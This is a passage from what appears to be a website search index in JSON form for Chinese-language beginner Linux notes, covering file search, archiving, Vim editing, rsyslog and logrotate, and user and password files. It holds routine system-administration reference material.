\u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0binode\u53f7\u4e3a123\u7684\u6587\u4ef6 find -links n \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\u786c\u94fe\u63a5\u6570\u4e3an\u7684\u6587\u4ef6\uff08n\u4e5f\u53ef\u4ee5\u662f+n\u3001-n\uff09","title":"find"},{"location":"week01/Linux\u6587\u4ef6\u67e5\u627e\u4e0e\u6253\u5305/#locatewhereiswhich","text":"locate \u547d\u4ee4\u5229\u7528\u4fdd\u5b58\u6709\u7cfb\u7edf\u4e2d\u6240\u6709\u6587\u4ef6\u540d\u548c\u76ee\u5f55\u540d\u7684\u6570\u636e\u5e93\u4e2d\u53bb\u67e5\u627e\u6765\u5b9e\u73b0\u5feb\u901f\u67e5\u627e updatedb \u66f4\u65b0\u6570\u636e\u5e93 --basename \u6839\u636e\u57fa\u7840\u540d\u79f0\u67e5\u627e whereis \u4ec5\u641c\u7d22\u4e8c\u8fdb\u5236\u6587\u4ef6\u6216man\u624b\u518c\u6587\u4ef6 which \u7528\u4e8e\u67e5\u627e\u547d\u4ee4\u7684\u5b8c\u6574\u8def\u5f84\u3002 -a \u5217\u51fa\u6240\u6709\u5339\u914d\u7684\u67e5\u627e\u7ed3\u679c","title":"locate/whereis/which"},{"location":"week01/Linux\u6587\u4ef6\u67e5\u627e\u4e0e\u6253\u5305/#_1","text":"gzip: gzip \u6587\u4ef6 \u538b\u7f29\u6587\u4ef6\u4e3a.gz gunzip \u6587\u4ef6 \u89e3\u538b\u7f29.gz\u6587\u4ef6 -k \u538b\u7f29\u6216\u89e3\u538b\u7f29\u65f6\u4fdd\u7559\u6e90\u6587\u4ef6 -v \u663e\u793a\u5904\u7406\u8be6\u60c5 tar: -c \u521b\u5efatar -z \u6307\u5b9agzip\u683c\u5f0f -v \u663e\u793a\u5904\u7406\u8be6\u60c5 -f \u6307\u5b9a\u6587\u4ef6\u540d\u79f0 -x \u8fd8\u539ftar","title":"\u6587\u4ef6\u6253\u5305\u548c\u89e3\u538b"},{"location":"week01/Linux\u6587\u672c\u7f16\u8f91/","text":"Linux\u6587\u672c\u7f16\u8f91 Vim \u4ece\u666e\u901a\u6a21\u5f0f\u5207\u6362\u5230\u63d2\u5165\u6a21\u5f0f\uff1a \u547d\u4ee4 \u8bf4\u660e i \u5728\u5149\u6807\u5904\u8fdb\u884c\u7f16\u8f91 a \u5728\u5149\u6807\u540e\u63d2\u5165\u7f16\u8f91 I \u5728\u884c\u9996\u63d2\u5165 A \u5728\u884c\u672b\u63d2\u5165 o \u5728\u5f53\u524d\u884c\u540e\u63d2\u5165\u4e00\u4e2a\u65b0\u884c O \u5728\u5f53\u524d\u884c\u524d\u63d2\u5165\u4e00\u4e2a\u65b0\u884c \u79fb\u52a8\u6e38\u6807\uff1a h , j , k , l \u5de6\u4e0b\u4e0a\u53f3 w \u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u5355\u8bcd\uff1b b \u79fb\u52a8\u5230\u4e0a\u4e00\u4e2a\u5355\u8bcd ^ \u79fb\u5230\u884c\u9996\u975e\u7a7a\uff1b 0 \u79fb\u5230\u884c\u9996\uff08HOME\uff09\uff1b $ \u79fb\u5230\u884c\u672b\uff08END\uff09 gg \u79fb\u5230\u9996\u884c\uff1b G \u79fb\u5230\u6700\u540e\u4e00\u884c\uff1b nG \u79fb\u81f3\u7b2cn\u884c\uff08\u6216 :n \uff09 \u5220\u9664\u64cd\u4f5c\uff1a \u547d\u4ee4 \u8bf4\u660e x \u5220\u9664\u6e38\u6807\u6240\u5728\u7684\u5b57\u7b26 X \u5220\u9664\u6e38\u6807\u6240\u5728\u524d\u4e00\u4e2a\u5b57\u7b26 dd \u5220\u9664\u6574\u884c dw \u5220\u9664\u4e00\u4e2a\u5355\u8bcd d$ \u6216 D \u5220\u9664\u81f3\u884c\u672b d^ \u5220\u9664\u81f3\u884c\u9996 ndd \u5220\u9664n\u884c J \u5220\u9664\u6362\u884c\u7b26 u \u64a4\u9500\uff1b Ctrl+R \u91cd\u505a \u590d\u5236\u7c98\u8d34\uff1a yy \u590d\u5236\u4e00\u884c; 3yy \u590d\u52363\u884c y$ \u590d\u5236\u81f3\u884c\u672b; yG \u590d\u5236\u81f3\u6587\u672c\u672b\u5c3e p \u7c98\u8d34\u81f3\u6e38\u6807\u540e\uff1b P \u7c98\u8d34\u81f3\u6e38\u6807\u524d ddp \u5c06\u6e38\u6807\u6240\u5728\u884c\u4e0e\u5b83\u4e0b\u9762\u7684\u884c\u4ea4\u6362 \u641c\u7d22\uff1a /string \u5411\u4e0b\u641c\u7d22\uff1b ?string \u5411\u4e0a\u641c\u7d22 n \u4e0b\u4e00\u4e2a\u641c\u7d22\u7ed3\u679c\uff1b N \u4e0a\u4e00\u4e2a\u641c\u7d22\u7ed3\u679c :set ignorecase , :set noignorecase \u8bbe\u7f6e\u662f\u5426\u5ffd\u7565\u5927\u5c0f\u5199 \u4fdd\u5b58\u548c\u9000\u51fa\uff1a w , w \u6587\u4ef6\u540d \u4fdd\u5b58 q \u9000\u51fa ! \u5f3a\u5236\u6267\u884c\uff0c\u5982 q! \u5f3a\u5236\u9000\u51fa\uff0c wq! \u5f3a\u5236\u4fdd\u5b58\u9000\u51fa \u7f16\u8f91\u591a\u4e2a\u6587\u4ef6\uff1a $ vim file1 file2 n \u5207\u6362\u5230\u4e0b\u4e00\u4e2a\u7f16\u8f91\u7684\u6587\u4ef6\uff1b n! \u5f3a\u5236\u5207\u6362 N \u5207\u6362\u5230\u4e0a\u4e00\u4e2a\u7f16\u8f91\u7684\u6587\u4ef6\uff1b N! \u5f3a\u5236\u5207\u6362 \u8fdb\u5165vim\u540e\u6253\u5f00\u65b0\u6587\u4ef6\uff1a :e file \u6253\u5f00\u65b0\u6587\u4ef6file :e# \u56de\u5230\u524d\u4e00\u4e2a\u6587\u4ef6 :ls \u5217\u51fa\u7f16\u8f91\u7684\u6587\u4ef6 :b file \u8fdb\u5165\u6587\u4ef6file\u7684\u7f16\u8f91\u754c\u9762 :bd file \u5220\u9664\u7f16\u8f91\u5217\u8868\u91cc\u7684\u6587\u4ef6file\uff08\u4e0d\u662f\u5220\u9664\u6587\u4ef6file\uff0c\u800c\u662f\u4ece :ls \u91cc\u5220\u9664\uff09 :e! file \u65b0\u6253\u5f00\u6587\u4ef6file\uff0c\u653e\u5f03\u6b63\u5728\u7f16\u8f91\u7684\u6587\u4ef6 :f \u663e\u793a\u6b63\u5728\u7f16\u8f91\u7684\u6587\u4ef6\u540d :f file \u91cd\u547d\u540d\u6b63\u5728\u7f16\u8f91\u7684\u6587\u4ef6\u4e3afile \u591a\u7a97\u53e3\uff1a :new \u6253\u5f00\u4e00\u4e2a\u65b0\u7684\u89c6\u7a97\u5e76\u7f16\u8f91\u4e00\u4e2a\u65b0\u6587\u4ef6 :sp file \u6253\u5f00\u65b0\u7684\u6c34\u5e73\u5206\u5c4f\u89c6\u7a97\u6765\u7f16\u8f91file :vsp file \u6253\u5f00\u65b0\u7684\u5782\u76f4\u5206\u5c4f\u89c6\u7a97\u6765\u7f16\u8f91file \u666e\u901a\u6a21\u5f0f\u4e0b\uff0c\u5148\u6309 Ctrl+w \uff0c\u518d\u6309\u4ee5\u4e0b\u952e\u53ef\u4ee5\u5bf9\u89c6\u7a97\u8fdb\u884c\u76f8\u5e94\u7684\u64cd\u4f5c\uff1a s , v \u6c34\u5e73\uff0c\u5782\u76f4\u5206\u9694\u89c6\u7a97\uff1b q \u7ed3\u675f\u89c6\u7a97\uff1b o \u6253\u5f00\u4e00\u4e2a\u65b0\u89c6\u7a97\u5e76\u9690\u85cf\u4e4b\u524d\u7684\u6240\u6709\u89c6\u7a97 h , j , k , l \u79fb\u5230\u5de6\uff0c\u4e0b\uff0c\u4e0a\uff0c\u53f3\u7684\u89c6\u7a97 H , J , K , L \u5c06\u5f53\u524d\u89c6\u7a97\u79fb\u81f3\u5de6\uff0c\u4e0b\uff0c\u4e0a\uff0c\u53f3\u65b9 - , + \u51cf\u5c0f\uff0c\u589e\u52a0\u89c6\u7a97\u9ad8\u5ea6\uff1b < , > \u51cf\u5c0f\uff0c\u589e\u52a0\u89c6\u7a97\u5bbd\u5ea6\u3002\uff08\u524d\u9762\u53ef\u4ee5\u52a0\u6570\u5b57\uff09 \u914d\u7f6evim\uff1a :scriptname \u5217\u51favim\u52a0\u8f7d\u811a\u672c\u3002\u7f16\u8f91 ~/.vimrc \u914d\u7f6evim \u547d\u4ee4\u884c\u6a21\u5f0f\uff1a :set nocompatible \u4e0d\u517c\u5bb9vi\uff1b :set compatible \u517c\u5bb9vi :set number , :set nu \u663e\u793a\u884c\u53f7\uff1b :set nonumber , :set nonu \u4e0d\u663e\u793a\u884c\u53f7 :set backup \u751f\u6210\u5907\u4efd\u6587\u4ef6\uff1b :set nobackup \u4e0d\u751f\u6210\u5907\u4efd\u6587\u4ef6 \u7f16\u7801\u683c\u5f0f\uff1a encoding vim\u5185\u90e8\u7f16\u7801\uff0c\u5efa\u8bae\u8bbe\u4e3autf-8 fileencoding \u6587\u4ef6\u7f16\u7801\uff0c\u53ef\u4ee5\u663e\u793a\u5f53\u524d\u6587\u4ef6\u7684\u7f16\u7801\uff08 :set fileencoding \uff09\u6216\u6307\u5b9a\u4fdd\u5b58\u65f6\u7684\u6587\u4ef6\u7f16\u7801\uff08 :set fileencoding=utf-8 \uff09 fileencodings vim\u4f1a\u6839\u636e\u8fd9\u4e2a\u5217\u8868\u6765\u81ea\u52a8\u63a2\u6d4b\u6587\u4ef6\u7684\u7f16\u7801\uff0c\u5efa\u8bae\u8bbe\u7f6e\uff1a :set fileencodings=ucs-bom,utf-8,cp936,gb18030,big5,euc-jp,euc-kr,latin1 \u53ef\u89c6\u6a21\u5f0f\uff1a v \u66ff\u6362\u6a21\u5f0f\uff1a R ; r \u66ff\u6362\u6e38\u6807\u6240\u5728\u5b57\u7b26 \u5f00\u542f\u9009\u62e9\u6a21\u5f0f\uff08\u9488\u5bf9gui\u7248vim\uff09\uff1a :set selectmode+=mouse \u67e5\u770bvim\u5185\u7f6e\u6559\u7a0b\uff1a $ vimtutor","title":"Linux \u6587\u672c\u7f16\u8f91"},{"location":"week01/Linux\u6587\u672c\u7f16\u8f91/#linux","text":"","title":"Linux\u6587\u672c\u7f16\u8f91"},{"location":"week01/Linux\u6587\u672c\u7f16\u8f91/#vim","text":"\u4ece\u666e\u901a\u6a21\u5f0f\u5207\u6362\u5230\u63d2\u5165\u6a21\u5f0f\uff1a \u547d\u4ee4 \u8bf4\u660e i \u5728\u5149\u6807\u5904\u8fdb\u884c\u7f16\u8f91 a \u5728\u5149\u6807\u540e\u63d2\u5165\u7f16\u8f91 I \u5728\u884c\u9996\u63d2\u5165 A \u5728\u884c\u672b\u63d2\u5165 o \u5728\u5f53\u524d\u884c\u540e\u63d2\u5165\u4e00\u4e2a\u65b0\u884c O \u5728\u5f53\u524d\u884c\u524d\u63d2\u5165\u4e00\u4e2a\u65b0\u884c \u79fb\u52a8\u6e38\u6807\uff1a h , j , k , l \u5de6\u4e0b\u4e0a\u53f3 w \u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u5355\u8bcd\uff1b b \u79fb\u52a8\u5230\u4e0a\u4e00\u4e2a\u5355\u8bcd ^ \u79fb\u5230\u884c\u9996\u975e\u7a7a\uff1b 0 \u79fb\u5230\u884c\u9996\uff08HOME\uff09\uff1b $ \u79fb\u5230\u884c\u672b\uff08END\uff09 gg \u79fb\u5230\u9996\u884c\uff1b G \u79fb\u5230\u6700\u540e\u4e00\u884c\uff1b nG \u79fb\u81f3\u7b2cn\u884c\uff08\u6216 :n \uff09 \u5220\u9664\u64cd\u4f5c\uff1a \u547d\u4ee4 \u8bf4\u660e x \u5220\u9664\u6e38\u6807\u6240\u5728\u7684\u5b57\u7b26 X \u5220\u9664\u6e38\u6807\u6240\u5728\u524d\u4e00\u4e2a\u5b57\u7b26 dd \u5220\u9664\u6574\u884c dw \u5220\u9664\u4e00\u4e2a\u5355\u8bcd d$ \u6216 D \u5220\u9664\u81f3\u884c\u672b d^ \u5220\u9664\u81f3\u884c\u9996 ndd \u5220\u9664n\u884c J \u5220\u9664\u6362\u884c\u7b26 u \u64a4\u9500\uff1b Ctrl+R \u91cd\u505a \u590d\u5236\u7c98\u8d34\uff1a yy \u590d\u5236\u4e00\u884c; 3yy \u590d\u52363\u884c y$ \u590d\u5236\u81f3\u884c\u672b; yG \u590d\u5236\u81f3\u6587\u672c\u672b\u5c3e p \u7c98\u8d34\u81f3\u6e38\u6807\u540e\uff1b P \u7c98\u8d34\u81f3\u6e38\u6807\u524d ddp \u5c06\u6e38\u6807\u6240\u5728\u884c\u4e0e\u5b83\u4e0b\u9762\u7684\u884c\u4ea4\u6362 \u641c\u7d22\uff1a /string \u5411\u4e0b\u641c\u7d22\uff1b ?string \u5411\u4e0a\u641c\u7d22 n \u4e0b\u4e00\u4e2a\u641c\u7d22\u7ed3\u679c\uff1b N \u4e0a\u4e00\u4e2a\u641c\u7d22\u7ed3\u679c :set ignorecase , :set noignorecase \u8bbe\u7f6e\u662f\u5426\u5ffd\u7565\u5927\u5c0f\u5199 \u4fdd\u5b58\u548c\u9000\u51fa\uff1a w , w \u6587\u4ef6\u540d \u4fdd\u5b58 q \u9000\u51fa ! \u5f3a\u5236\u6267\u884c\uff0c\u5982 q! \u5f3a\u5236\u9000\u51fa\uff0c wq! \u5f3a\u5236\u4fdd\u5b58\u9000\u51fa \u7f16\u8f91\u591a\u4e2a\u6587\u4ef6\uff1a $ vim file1 file2 n \u5207\u6362\u5230\u4e0b\u4e00\u4e2a\u7f16\u8f91\u7684\u6587\u4ef6\uff1b n! \u5f3a\u5236\u5207\u6362 N \u5207\u6362\u5230\u4e0a\u4e00\u4e2a\u7f16\u8f91\u7684\u6587\u4ef6\uff1b N! \u5f3a\u5236\u5207\u6362 \u8fdb\u5165vim\u540e\u6253\u5f00\u65b0\u6587\u4ef6\uff1a :e file \u6253\u5f00\u65b0\u6587\u4ef6file :e# \u56de\u5230\u524d\u4e00\u4e2a\u6587\u4ef6 :ls \u5217\u51fa\u7f16\u8f91\u7684\u6587\u4ef6 :b file \u8fdb\u5165\u6587\u4ef6file\u7684\u7f16\u8f91\u754c\u9762 :bd file \u5220\u9664\u7f16\u8f91\u5217\u8868\u91cc\u7684\u6587\u4ef6file\uff08\u4e0d\u662f\u5220\u9664\u6587\u4ef6file\uff0c\u800c\u662f\u4ece :ls \u91cc\u5220\u9664\uff09 :e! file \u65b0\u6253\u5f00\u6587\u4ef6file\uff0c\u653e\u5f03\u6b63\u5728\u7f16\u8f91\u7684\u6587\u4ef6 :f \u663e\u793a\u6b63\u5728\u7f16\u8f91\u7684\u6587\u4ef6\u540d :f file \u91cd\u547d\u540d\u6b63\u5728\u7f16\u8f91\u7684\u6587\u4ef6\u4e3afile \u591a\u7a97\u53e3\uff1a :new \u6253\u5f00\u4e00\u4e2a\u65b0\u7684\u89c6\u7a97\u5e76\u7f16\u8f91\u4e00\u4e2a\u65b0\u6587\u4ef6 :sp file \u6253\u5f00\u65b0\u7684\u6c34\u5e73\u5206\u5c4f\u89c6\u7a97\u6765\u7f16\u8f91file :vsp file \u6253\u5f00\u65b0\u7684\u5782\u76f4\u5206\u5c4f\u89c6\u7a97\u6765\u7f16\u8f91file \u666e\u901a\u6a21\u5f0f\u4e0b\uff0c\u5148\u6309 Ctrl+w \uff0c\u518d\u6309\u4ee5\u4e0b\u952e\u53ef\u4ee5\u5bf9\u89c6\u7a97\u8fdb\u884c\u76f8\u5e94\u7684\u64cd\u4f5c\uff1a s , v \u6c34\u5e73\uff0c\u5782\u76f4\u5206\u9694\u89c6\u7a97\uff1b q \u7ed3\u675f\u89c6\u7a97\uff1b o \u6253\u5f00\u4e00\u4e2a\u65b0\u89c6\u7a97\u5e76\u9690\u85cf\u4e4b\u524d\u7684\u6240\u6709\u89c6\u7a97 h , j , k , l \u79fb\u5230\u5de6\uff0c\u4e0b\uff0c\u4e0a\uff0c\u53f3\u7684\u89c6\u7a97 H , J , K , L \u5c06\u5f53\u524d\u89c6\u7a97\u79fb\u81f3\u5de6\uff0c\u4e0b\uff0c\u4e0a\uff0c\u53f3\u65b9 - , + \u51cf\u5c0f\uff0c\u589e\u52a0\u89c6\u7a97\u9ad8\u5ea6\uff1b < , > \u51cf\u5c0f\uff0c\u589e\u52a0\u89c6\u7a97\u5bbd\u5ea6\u3002\uff08\u524d\u9762\u53ef\u4ee5\u52a0\u6570\u5b57\uff09 \u914d\u7f6evim\uff1a :scriptname \u5217\u51favim\u52a0\u8f7d\u811a\u672c\u3002\u7f16\u8f91 ~/.vimrc \u914d\u7f6evim \u547d\u4ee4\u884c\u6a21\u5f0f\uff1a :set nocompatible \u4e0d\u517c\u5bb9vi\uff1b :set compatible \u517c\u5bb9vi :set number , :set nu \u663e\u793a\u884c\u53f7\uff1b :set nonumber , :set nonu \u4e0d\u663e\u793a\u884c\u53f7 :set backup \u751f\u6210\u5907\u4efd\u6587\u4ef6\uff1b :set nobackup \u4e0d\u751f\u6210\u5907\u4efd\u6587\u4ef6 \u7f16\u7801\u683c\u5f0f\uff1a encoding vim\u5185\u90e8\u7f16\u7801\uff0c\u5efa\u8bae\u8bbe\u4e3autf-8 fileencoding \u6587\u4ef6\u7f16\u7801\uff0c\u53ef\u4ee5\u663e\u793a\u5f53\u524d\u6587\u4ef6\u7684\u7f16\u7801\uff08 :set fileencoding \uff09\u6216\u6307\u5b9a\u4fdd\u5b58\u65f6\u7684\u6587\u4ef6\u7f16\u7801\uff08 :set fileencoding=utf-8 \uff09 fileencodings vim\u4f1a\u6839\u636e\u8fd9\u4e2a\u5217\u8868\u6765\u81ea\u52a8\u63a2\u6d4b\u6587\u4ef6\u7684\u7f16\u7801\uff0c\u5efa\u8bae\u8bbe\u7f6e\uff1a :set fileencodings=ucs-bom,utf-8,cp936,gb18030,big5,euc-jp,euc-kr,latin1 \u53ef\u89c6\u6a21\u5f0f\uff1a v \u66ff\u6362\u6a21\u5f0f\uff1a R ; r \u66ff\u6362\u6e38\u6807\u6240\u5728\u5b57\u7b26 \u5f00\u542f\u9009\u62e9\u6a21\u5f0f\uff08\u9488\u5bf9gui\u7248vim\uff09\uff1a :set selectmode+=mouse \u67e5\u770bvim\u5185\u7f6e\u6559\u7a0b\uff1a $ vimtutor","title":"Vim"},{"location":"week01/Linux\u65e5\u5fd7\u7cfb\u7edf/","text":"Linux\u65e5\u5fd7\u7cfb\u7edf \u65e5\u5fd7\u6587\u4ef6\u4f4d\u4e8e\uff1a /var/log alternatives.log \u8bb0\u5f55\u7cfb\u7edf\u7684\u66f4\u65b0\u66ff\u4ee3\u4fe1\u606f dpkg.log \u8bb0\u5f55 dpkg \u547d\u4ee4\u5b89\u88c5\u6216\u6e05\u9664\u8f6f\u4ef6\u5305\u7684\u4fe1\u606f apt \u6587\u4ef6\u5939\u4e0b\uff0c history.log \u8bb0\u5f55\u4e86 apt \u5b89\u88c5\u6216\u79fb\u9664\u8f6f\u4ef6\u5305\u7684\u4fe1\u606f\uff0c term.log \u8bb0\u5f55\u4e86\u5b89\u88c5\u8fc7\u7a0b\u4fe1\u606f wtmp \u8bb0\u5f55\u7528\u6237\u767b\u5f55\u3001\u6ce8\u9500\u548c\u7cfb\u7edf\u542f\u52a8\u3001\u505c\u673a\u5386\u53f2\uff0c\u4f7f\u7528 last \u547d\u4ee4\u67e5\u770b lastlog \u8bb0\u5f55\u5404\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u7684\u4fe1\u606f\uff0c\u4f7f\u7528 lastlog \u547d\u4ee4\u67e5\u770b rsyslog\u4e3b\u8981\u7531Input, Output, Parser\u4e09\u4e2a\u6a21\u5757\u6784\u6210\u3002 \u542f\u52a8\u670d\u52a1\uff1a sudo service rsyslog start rsyslog\u914d\u7f6e\u6587\u4ef6\uff1a /etc/rsyslog.conf \u914d\u7f6ersyslog\u6a21\u5757\u52a0\u8f7d\u3001\u6587\u4ef6\u6240\u5c5e\u8005\u7b49 /etc/rsyslog.d/50-default.conf \u65e5\u5fd7\u8bbe\u5907\u65e5\u5fd7\u89c4\u5219 rsyslog\u914d\u7f6e\u5b98\u65b9\u6587\u6863 # 50-default.conf kern.* -/var/log/kern.log # *\u8868\u793a\u6240\u6709\u7ea7\u522b\u7684\u65e5\u5fd7\u4fe1\u606f\u90fd\u5199\u5165\uff0c\u8def\u5f84\u524d\u7684-\u8868\u793a\u5f02\u6b65\u5199\u5165 \u53ef\u4ee5\u4f7f\u7528 logger \u5411syslog\u53d1\u9001\u65e5\u5fd7\u3002 logrotate \u662f\u4e00\u4e2a\u65e5\u5fd7\u6587\u4ef6\u7ba1\u7406\u5de5\u5177\uff0c\u662f\u57fa\u4e8ecron\u6765\u8fd0\u884c\u7684\uff0c\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e /etc/logrotate.conf \u548c /etc/logrotate.d/ \u3002 \u5e38\u7528\u914d\u7f6e\u53c2\u6570\uff1a monthly \u65e5\u5fd7\u6587\u4ef6\u6309\u6708\u5b58\u50a8\u3002\u53ef\u4ee5\u6362\u6210 daily , weekly \u6216 yearly rotate 5 \u4e00\u6b21\u8f6c\u50a85\u4e2a\u5f52\u6863\u65e5\u5fd7 compress \u5df2\u8f6c\u50a8\u7684\u65e5\u5fd7\u7528gzip\u8fdb\u884c\u538b\u7f29 delaycompress \u4e0d\u4f1a\u5c06\u6700\u8fd1\u7684\u538b\u7f29 missingok \u8f6c\u50a8\u65f6\u5ffd\u7565\u9519\u8bef notifempty \u5982\u679c\u65e5\u5fd7\u6587\u4ef6\u4e3a\u7a7a\uff0c\u4e0d\u8fdb\u884c\u8f6c\u50a8 create 644 root root \u4ee5\u6307\u5b9a\u7684\u6743\u9650\u521b\u5efa\u65b0\u7684\u65e5\u5fd7\u6587\u4ef6\uff0clogrotate\u4e5f\u4f1a\u91cd\u547d\u540d\u539f\u59cb\u65e5\u5fd7\u6587\u4ef6 postrotate/endscript \u5b8c\u6210\u540e\u8fd0\u884c\u6307\u5b9a\u7684\u547d\u4ee4 \u6ce8\uff1a\u7f16\u5199\u7684\u4f4d\u4e8e logrotate.d \u91cc\u7684\u914d\u7f6e\u6587\u4ef6\u7684\u6743\u9650\u987b\u4e3a -rw-r--r-- logrotate \u5e38\u7528\u9009\u9879\uff1a -d \u4ee5\u9884\u6f14\u65b9\u5f0f\u8fd0\u884c -f \u5f3a\u5236\u8fdb\u884c -v \u8be6\u7ec6\u8f93\u51fa","title":"Linux \u65e5\u5fd7\u7cfb\u7edf"},{"location":"week01/Linux\u65e5\u5fd7\u7cfb\u7edf/#linux","text":"\u65e5\u5fd7\u6587\u4ef6\u4f4d\u4e8e\uff1a /var/log alternatives.log \u8bb0\u5f55\u7cfb\u7edf\u7684\u66f4\u65b0\u66ff\u4ee3\u4fe1\u606f dpkg.log \u8bb0\u5f55 dpkg \u547d\u4ee4\u5b89\u88c5\u6216\u6e05\u9664\u8f6f\u4ef6\u5305\u7684\u4fe1\u606f apt \u6587\u4ef6\u5939\u4e0b\uff0c history.log \u8bb0\u5f55\u4e86 apt \u5b89\u88c5\u6216\u79fb\u9664\u8f6f\u4ef6\u5305\u7684\u4fe1\u606f\uff0c term.log \u8bb0\u5f55\u4e86\u5b89\u88c5\u8fc7\u7a0b\u4fe1\u606f wtmp \u8bb0\u5f55\u7528\u6237\u767b\u5f55\u3001\u6ce8\u9500\u548c\u7cfb\u7edf\u542f\u52a8\u3001\u505c\u673a\u5386\u53f2\uff0c\u4f7f\u7528 last \u547d\u4ee4\u67e5\u770b lastlog \u8bb0\u5f55\u5404\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u7684\u4fe1\u606f\uff0c\u4f7f\u7528 lastlog \u547d\u4ee4\u67e5\u770b rsyslog\u4e3b\u8981\u7531Input, Output, Parser\u4e09\u4e2a\u6a21\u5757\u6784\u6210\u3002 \u542f\u52a8\u670d\u52a1\uff1a sudo service rsyslog start rsyslog\u914d\u7f6e\u6587\u4ef6\uff1a /etc/rsyslog.conf \u914d\u7f6ersyslog\u6a21\u5757\u52a0\u8f7d\u3001\u6587\u4ef6\u6240\u5c5e\u8005\u7b49 /etc/rsyslog.d/50-default.conf \u65e5\u5fd7\u8bbe\u5907\u65e5\u5fd7\u89c4\u5219 rsyslog\u914d\u7f6e\u5b98\u65b9\u6587\u6863 # 50-default.conf kern.* -/var/log/kern.log # *\u8868\u793a\u6240\u6709\u7ea7\u522b\u7684\u65e5\u5fd7\u4fe1\u606f\u90fd\u5199\u5165\uff0c\u8def\u5f84\u524d\u7684-\u8868\u793a\u5f02\u6b65\u5199\u5165 \u53ef\u4ee5\u4f7f\u7528 logger \u5411syslog\u53d1\u9001\u65e5\u5fd7\u3002 logrotate \u662f\u4e00\u4e2a\u65e5\u5fd7\u6587\u4ef6\u7ba1\u7406\u5de5\u5177\uff0c\u662f\u57fa\u4e8ecron\u6765\u8fd0\u884c\u7684\uff0c\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e /etc/logrotate.conf \u548c /etc/logrotate.d/ \u3002 \u5e38\u7528\u914d\u7f6e\u53c2\u6570\uff1a monthly \u65e5\u5fd7\u6587\u4ef6\u6309\u6708\u5b58\u50a8\u3002\u53ef\u4ee5\u6362\u6210 daily , weekly \u6216 yearly rotate 5 \u4e00\u6b21\u8f6c\u50a85\u4e2a\u5f52\u6863\u65e5\u5fd7 compress \u5df2\u8f6c\u50a8\u7684\u65e5\u5fd7\u7528gzip\u8fdb\u884c\u538b\u7f29 delaycompress \u4e0d\u4f1a\u5c06\u6700\u8fd1\u7684\u538b\u7f29 missingok \u8f6c\u50a8\u65f6\u5ffd\u7565\u9519\u8bef notifempty \u5982\u679c\u65e5\u5fd7\u6587\u4ef6\u4e3a\u7a7a\uff0c\u4e0d\u8fdb\u884c\u8f6c\u50a8 create 644 root root \u4ee5\u6307\u5b9a\u7684\u6743\u9650\u521b\u5efa\u65b0\u7684\u65e5\u5fd7\u6587\u4ef6\uff0clogrotate\u4e5f\u4f1a\u91cd\u547d\u540d\u539f\u59cb\u65e5\u5fd7\u6587\u4ef6 postrotate/endscript \u5b8c\u6210\u540e\u8fd0\u884c\u6307\u5b9a\u7684\u547d\u4ee4 \u6ce8\uff1a\u7f16\u5199\u7684\u4f4d\u4e8e logrotate.d \u91cc\u7684\u914d\u7f6e\u6587\u4ef6\u7684\u6743\u9650\u987b\u4e3a -rw-r--r-- logrotate \u5e38\u7528\u9009\u9879\uff1a -d \u4ee5\u9884\u6f14\u65b9\u5f0f\u8fd0\u884c -f \u5f3a\u5236\u8fdb\u884c -v \u8be6\u7ec6\u8f93\u51fa","title":"Linux\u65e5\u5fd7\u7cfb\u7edf"},{"location":"week01/Linux\u7528\u6237\u4e0e\u6743\u9650/","text":"Linux\u7528\u6237\u4e0e\u6743\u9650 \u914d\u7f6e\u6587\u4ef6 \u7528\u6237\u4fe1\u606f\u6587\u4ef6(/etc/passwd)\u4ee5 : \u6765\u5206\u96947\u4e2a\u5b57\u6bb5\uff1a \u7528\u6237\u540d \u5bc6\u7801\u5360\u4f4d\u7b26\uff08 x \u8868\u793a\u7528\u6237\u9700\u8981\u5bc6\u7801\u767b\u5f55\uff09 \u7528\u6237\u6807\u8bc6\u53f7\uff08UID,500\u4ee5\u4e0a\u4e3a\u5efa\u7acb\u7684\u7528\u6237\uff0c\u5176\u4f59\u4e3a\u7cfb\u7edf\u7528\u6237\uff09 \u7ec4\u6807\u8bc6\u53f7\uff08GID\uff09 \u6ce8\u91ca\u6027\u63cf\u8ff0 \u4e3b\u76ee\u5f55 \u767b\u5f55\u7684shell \u5bc6\u7801\u6587\u4ef6(/etc/shadow)\u4ee5 : \u6765\u5206\u9694\u5b57\u6bb5\uff1a \u7528\u6237\u540d \u52a0\u5bc6\u53e3\u4ee4 \u6700\u540e\u4e00\u6b21\u4fee\u6539\u65f6\u95f4 \u5bc6\u7801\u6700\u77ed\u6709\u6548\u5929\u6570 \u5bc6\u7801\u6700\u957f\u6709\u6548\u5929\u6570 \u5bc6\u7801\u8fc7\u671f\u524d\u7684\u8b66\u544a\u65f6\u95f4 \u4e0d\u6d3b\u52a8\u65f6\u95f4 \u7528\u6237\u5931\u6548\u65f6\u95f4 \u6682\u65f6\u4fdd\u7559\u672a\u4f7f\u7528 \u8bfb\u53d6/etc/shadow\u9700\u8981sudo \u7528\u6237\u7ec4\u6587\u4ef6(/etc/group)\u4ee5 : \u6765\u5206\u9694\u5b57\u6bb5\uff1a \u7ec4\u540d \u53e3\u4ee4 \u7ec4\u6807\u8bc6\u53f7\uff08GID\uff09 \u7ec4\u5185\u7528\u6237\u5217\u8868\uff08\u591a\u7528\u6237\u53ef\u7528\u9017\u53f7\u5206\u9694\u5f00\uff09 \u7528\u6237\u7ba1\u7406 useradd \u547d\u4ee4\u53ef\u4ee5\u6dfb\u52a0\u7528\u6237: -d \u6307\u5b9a\u5bb6\u76ee\u5f55\uff08 -m \u521b\u5efa\u5bb6\u76ee\u5f55\uff09 -s \u6307\u5b9a\u767b\u5f55Shell -g \u6307\u5b9a\u7528\u6237\u7ec4 -G \u9644\u52a0\u7528\u6237\u7ec4 adduser\u547d\u4ee4\u4e5f\u53ef\u4ee5\u6dfb\u52a0\u7528\u6237 passwd \u547d\u4ee4\u53ef\u4ee5\u7ba1\u7406\u5bc6\u7801\uff1a sudo passwd xxx \u8bbe\u7f6e\u7528\u6237xxx\u7684\u5bc6\u7801 -d \u5220\u9664\u5bc6\u7801 -l 